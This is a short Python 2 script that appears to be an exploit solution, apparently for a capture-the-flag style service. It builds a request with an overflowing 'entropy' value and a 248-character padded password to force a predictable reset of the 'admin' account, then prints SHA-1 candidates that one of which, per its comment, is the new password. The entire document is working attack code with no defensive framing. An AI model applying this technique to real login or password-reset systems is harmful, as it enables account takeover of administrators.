import requests
import hashlib

# Send this data to the server along with a correct captcha
data = {"entropy":"1152921504606846975X",
     "user":"admin",
    "pass":"A"*(256-8),
    "reset":1}
print data

# One of these passes will now be the correct password
for i in range(0,0xf):
    h = hashlib.sha1()
    h.update("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1000000%x"%i)
    print h.digest().encode('base64')
